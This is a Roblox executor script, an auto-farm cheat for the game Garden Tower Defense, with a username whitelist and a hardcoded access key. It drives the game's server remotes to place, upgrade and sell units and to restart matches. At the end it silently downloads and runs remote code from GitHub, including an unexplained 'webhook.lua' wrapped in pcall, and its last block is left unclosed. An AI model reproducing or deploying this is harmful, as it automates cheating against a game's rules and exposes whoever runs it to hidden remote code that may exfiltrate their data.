--// Garden Tower Defense - GRAVEYARD MAP AUTO FARM with WindUI

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

local whitelist = {
    ["holasoy_kier"] = true,
    ["Sugaplum753"] = true,
    ["Nstub1234"] = true,
    ["Girthentersmyvergona"] = true,
    ["Derick12401"] = true,
    ["Threldor"] = true,
    ["keraieu"] = true,
    ["PurpPom"] = true,
    ["niceone10075"] = true,
    ["lyrachanx"] = true,
    ["BLACK_UNNIE1"] = false,
    ["PHOENIX7913"] = false,
    ["Draco_015"] = true,
    ["egoiks22921312"] = true,
    ["LEGKO_RUST"] = true,
    ["idontkosel"] = true,
    ["HappyLeah4"] = true,
    ["LEGKO_RUST2"] = true,
    ["DEGOSN8"] = true,
    ["GBethyian51"] = true,
    ["Nr1bulle"] = true,
    ["ashleypangag123q"] = true,
    ["tranhuyxsmax1"] = true,
    ["9140735ww"] = true,
    ["jooppppppppppk"] = true,
    ["BrooklynPix3lEagl320"] = true,
    ["SavannahFuryPanda81"] = true,
    ["Grace_Prism201364"] = true,
    ["Misterfarmi0"] = true,
    ["67cheesy"] = true
}

if not whitelist[plr.Name] then
    plr:Kick("You are not whitelisted.")
    return
end

-- Load WindUI
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/refs/heads/main/dist/main.lua"))()

local rs = game:GetService("ReplicatedStorage")
local remotes = rs:WaitForChild("RemoteFunctions")
local Workspace = game:GetService("Workspace")
local entities = Workspace:WaitForChild("Map"):WaitForChild("Entities")

_G.myUnitIDs = _G.myUnitIDs or {}
_G.trackingEnabled = false
_G.currentWave = 0
_G.farmingActive = false
_G.selectedSpeed = 3

-- Key System
local validKey = "candy"
local keyEntered = false

local function detectWave()
    local success, result = pcall(function()
        local guiNoInset = plr.PlayerGui:FindFirstChild("GameGuiNoInset")
        if not guiNoInset then return nil end
        
        for _, obj in pairs(guiNoInset:GetDescendants()) do
            if obj:IsA("TextLabel") and obj.Visible then
                local text = obj.Text
                local difficulty, waveNum, totalWaves = string.match(text, "(%w+):%s*Wave%s*(%d+)%s*/%s*(%d+)")
                if waveNum then
                    return tonumber(waveNum)
                end
            end
        end
        return nil
    end)
    return success and result or nil
end

task.spawn(function()
    while true do
        task.wait(0.5)
        if _G.trackingEnabled then
            local wave = detectWave()
            if wave then
                _G.currentWave = wave
            end
        end
    end
end)

local function setupAutoSkip()
    task.delay(3.5, function()
        pcall(function()
            local gui = plr.PlayerGui:WaitForChild("GameGuiNoInset")
            local autoSkipButton = gui.Screen.Top.WaveControls:WaitForChild("AutoSkip")
            spawn(function()
                while _G.trackingEnabled do
                    task.wait(0.8)
                    pcall(function()
                        local c = autoSkipButton.ImageColor3
                        if c.R > 0.8 and c.G > 0.5 then
                            local conns = getconnections(autoSkipButton.MouseButton1Click)
                            if conns and #conns > 0 then conns[1]:Fire() end
                        end
                    end)
                end
            end)
        end)
    end)
end

local function getMoney()
    return plr:GetAttribute("Cash") or 0
end

local function getUnitID(unit)
    for attempt = 1, 10 do
        for _, v in ipairs(unit:GetDescendants()) do
            if (v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue")) and string.find(string.lower(v.Name), "id") then
                return v.Value
            end
        end
        for attrName, attrValue in pairs(unit:GetAttributes()) do
            if string.find(string.lower(attrName), "id") then
                return attrValue
            end
        end
        task.wait(0.2)
    end
    return nil
end

entities.ChildAdded:Connect(function(child)
    if _G.trackingEnabled then
        task.spawn(function()
            task.wait(1)
            if child and child.Parent and string.find(child.Name, "unit_") then
                local unitID = getUnitID(child)
                if unitID then
                    table.insert(_G.myUnitIDs, unitID)
                end
            end
        end)
    end
end)

local function randomizePosition(basePosition, variation)
    variation = variation or 1.5
    local randomX = basePosition.X + (math.random() * variation * 2 - variation)
    local randomZ = basePosition.Z + (math.random() * variation * 2 - variation)
    return Vector3.new(randomX, basePosition.Y, randomZ)
end

local function tryPlaceUnit(unit, basePosition, maxAttempts)
    maxAttempts = maxAttempts or 5
    for attempt = 1, maxAttempts do
        local randomPos = randomizePosition(basePosition, 1.5)
        local data = {
            CF = CFrame.new(randomPos.X, randomPos.Y, randomPos.Z, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
            Rotation = 180,
            Valid = true,
            Position = randomPos
        }
        local success, result = pcall(function()
            return remotes.PlaceUnit:InvokeServer(unit, data)
        end)
        if success and result then
            return true
        else
            task.wait(0.15)
        end
    end
    return false
end

local function upgradeUnit(unitID)
    local success = pcall(function()
        remotes.UpgradeUnit:InvokeServer(unitID)
    end)
    return success
end

local function rbTomatoEDStrategy()
    task.spawn(function()
        while getMoney() < 100 do task.wait(0.2) end
        tryPlaceUnit("unit_tomato_rainbow", Vector3.new(-344.7191162109375, 61.680301666259766, -702.30859375), 5)
        task.wait(0.3)
        
        local waitTime = 0
        while #_G.myUnitIDs < 1 and waitTime < 10 do
            task.wait(0.2)
            waitTime = waitTime + 0.2
        end
        
        if #_G.myUnitIDs < 1 then return end
        local rb1ID = _G.myUnitIDs[1]
        
        while getMoney() < 125 do task.wait(0.2) end
        upgradeUnit(rb1ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 175 do task.wait(0.2) end
        upgradeUnit(rb1ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 100 do task.wait(0.2) end
        tryPlaceUnit("unit_tomato_rainbow", Vector3.new(-351.1462097167969, 61.68030548095703, -711.151123046875), 5)
        task.wait(0.3)
        
        waitTime = 0
        while #_G.myUnitIDs < 2 and waitTime < 10 do
            task.wait(0.2)
            waitTime = waitTime + 0.2
        end
        
        if #_G.myUnitIDs < 2 then return end
        local rb2ID = _G.myUnitIDs[2]
        
        while getMoney() < 125 do task.wait(0.2) end
        upgradeUnit(rb2ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 175 do task.wait(0.2) end
        upgradeUnit(rb2ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 350 do task.wait(0.2) end
        upgradeUnit(rb2ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 500 do task.wait(0.2) end
        upgradeUnit(rb2ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 350 do task.wait(0.2) end
        upgradeUnit(rb1ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 500 do task.wait(0.2) end
        upgradeUnit(rb1ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 100 do task.wait(0.2) end
        tryPlaceUnit("unit_tomato_rainbow", Vector3.new(-334.91607666015625, 61.6803092956543, -721.29736328125), 5)
        task.wait(0.3)
        
        waitTime = 0
        while #_G.myUnitIDs < 3 and waitTime < 10 do
            task.wait(0.2)
            waitTime = waitTime + 0.2
        end
        
        if #_G.myUnitIDs < 3 then return end
        local rb3ID = _G.myUnitIDs[3]
        
        while getMoney() < 125 do task.wait(0.2) end
        upgradeUnit(rb3ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 175 do task.wait(0.2) end
        upgradeUnit(rb3ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 350 do task.wait(0.2) end
        upgradeUnit(rb3ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 500 do task.wait(0.2) end
        upgradeUnit(rb3ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 6000 do task.wait(0.2) end
        tryPlaceUnit("unit_golem_dragon", Vector3.new(-319.2539978027344, 61.68030548095703, -720.3961181640625), 5)
        task.wait(0.3)
        
        while getMoney() < 6000 do task.wait(0.2) end
        tryPlaceUnit("unit_golem_dragon", Vector3.new(-331.4523620605469, 61.680301666259766, -735.6544799804688), 5)
        task.wait(0.3)
        
        while getMoney() < 6000 do task.wait(0.2) end
        tryPlaceUnit("unit_golem_dragon", Vector3.new(-319.48638916015625, 61.68030548095703, -734.1026000976562), 5)
        task.wait(0.3)
        
        while _G.currentWave < 20 do task.wait(0.5) end
        
        local randomDelay = 0.5 + (math.random() * 0.5)
        task.wait(randomDelay)
        
        if #_G.myUnitIDs >= 6 then
            for i = 1, 6 do
                pcall(function() remotes.SellUnit:InvokeServer(_G.myUnitIDs[i]) end)
                task.wait(0.05)
            end
        else
            for unitID = 1, 6 do
                pcall(function() remotes.SellUnit:InvokeServer(unitID) end)
                task.wait(0.3 + (math.random() * 0.2))
            end
        end
        
        _G.myUnitIDs = {}
    end)
end

local function waitForGameEnd()
    local gui = plr.PlayerGui:WaitForChild("GameGui")
    local gameEndFrame = gui.Screen.Middle:WaitForChild("GameEnd")
    repeat task.wait(0.5) until gameEndFrame.Visible == true
end

local function clickPlayAgain()
    local clicked = false
    for attempt = 1, 15 do
        pcall(function()
            local gui = plr.PlayerGui:FindFirstChild("GameGui")
            if gui then
                for _, button in ipairs(gui:GetDescendants()) do
                    if button:IsA("TextButton") and button.Visible then
                        local text = string.lower(button.Text)
                        if string.find(text, "again") or string.find(text, "play") then
                            local conns = getconnections(button.MouseButton1Click)
                            if conns and #conns > 0 then
                                conns[1]:Fire()
                                clicked = true
                                return
                            end
                        end
                    end
                end
            end
        end)
        if clicked then break end
        task.wait(0.15)
    end
    if not clicked then
        pcall(function()
            remotes.RestartGame:InvokeServer()
        end)
    end
end

local function setupGame(tickSpeed)
    pcall(function()
        remotes.LobbySetMap_6:InvokeServer("map_graveyard")
    end)
    task.wait(0.25)
    remotes.PlaceDifficultyVote:InvokeServer("dif_impossible")
    task.wait(0.25)
    remotes.ChangeTickSpeed:InvokeServer(tickSpeed)
    setupAutoSkip()
end

local function startFarming()
    while _G.farmingActive do
        _G.myUnitIDs = {}
        _G.currentWave = 0
        _G.trackingEnabled = true
        
        setupGame(_G.selectedSpeed)
        task.wait(1.5)
        
        rbTomatoEDStrategy()
        
        waitForGameEnd()
        task.wait(0.5)
        
        _G.trackingEnabled = false
        clickPlayAgain()
        task.wait(2)
    end
end

-- Create WindUI Window
local Window = WindUI:CreateWindow({
    Title = "Noah Hub",
    Author = "by Threldor",
    Folder = "NoahHubUnitVer",
    Icon = "sprout",
    
    OpenButton = {
        Title = "NoahHub",
        CornerRadius = UDim.new(0, 10),
        StrokeThickness = 2,
        Enabled = true,
        Draggable = true,
        OnlyMobile = false,
        Color = ColorSequence.new(
            Color3.fromHex("#30ff6a"), 
            Color3.fromHex("#2fff91")
        )
    }
})

-- Key System Section
local KeySection = Window:Section({
    Title = "Key System",
})

local KeyTab = KeySection:Tab({
    Title = "Authentication",
    Icon = "key",
})

KeyTab:Section({
    Title = "Enter Access Key",
    TextSize = 20,
})

KeyTab:Space()

local KeyInput = KeyTab:Input({
    Title = "Key",
    Icon = "key",
    Placeholder = "Enter key here...",
    Callback = function(value)
        if value == validKey then
            keyEntered = true
            WindUI:Notify({
                Title = "Success!",
                Content = "Key accepted! Access granted.",
                Icon = "check",
            })
            task.wait(0.5)
            KeySection:Destroy()
        else
            WindUI:Notify({
                Title = "Invalid Key",
                Content = "The key you entered is incorrect.",
                Icon = "x",
            })
        end
    end
})

KeyTab:Button({
    Title = "Submit Key",
    Icon = "check",
    Color = Color3.fromHex("#30ff6a"),
    Justify = "Center",
    Callback = function()
        local inputValue = KeyInput:Get()
        if inputValue == validKey then
            keyEntered = true
            WindUI:Notify({
                Title = "Success!",
                Content = "Key accepted! Access granted.",
                Icon = "check",
            })
            task.wait(0.5)
            KeySection:Destroy()
        else
            WindUI:Notify({
                Title = "Invalid Key",
                Content = "The key you entered is incorrect.",
                Icon = "x",
            })
        end
    end
})

-- Main Section (only visible after key)
task.spawn(function()
    repeat task.wait(0.1) until keyEntered
    
    local MainSection = Window:Section({
        Title = "Auto Farm",
    })
    
    local FarmTab = MainSection:Tab({
        Title = "Graveyard Farm",
        Icon = "sprout",
    })
    
    FarmTab:Section({
        Title = "RB Tomato & Elder Dragon Strategy",
        TextSize = 18,
    })
    
    FarmTab:Space()
    
    FarmTab:Toggle({
        Title = "Enable Auto Farm",
        Desc = "Start/Stop automatic farming",
        Icon = "play",
        Default = false,
        Callback = function(state)
            _G.farmingActive = state
            if state then
                WindUI:Notify({
                    Title = "Auto Farm Started",
                    Content = "Farming with " .. _G.selectedSpeed .. "x speed",
                    Icon = "check",
                })
                task.spawn(startFarming)
            else
                WindUI:Notify({
                    Title = "Auto Farm Stopped",
                    Content = "Farm stopped successfully",
                    Icon = "pause",
                })
            end
        end
    })
    
    FarmTab:Space()
    
    FarmTab:Dropdown({
        Title = "Game Speed",
        Desc = "Select game speed multiplier",
        Icon = "zap",
        Values = {
            {Title = "2x Speed", Icon = "gauge"},
            {Title = "3x Speed", Icon = "gauge"},
        },
        Value = "3x Speed",
        Callback = function(option)
            if option.Title == "2x Speed" then
                _G.selectedSpeed = 2
            else
                _G.selectedSpeed = 3
            end
            WindUI:Notify({
                Title = "Speed Changed",
                Content = "Game speed set to " .. option.Title,
                Icon = "zap",
            })
        end
    })

-- Load external scripts
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/elisabloom/ElisaHub/refs/heads/main/webhook.lua"))() 
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
    end)
end)
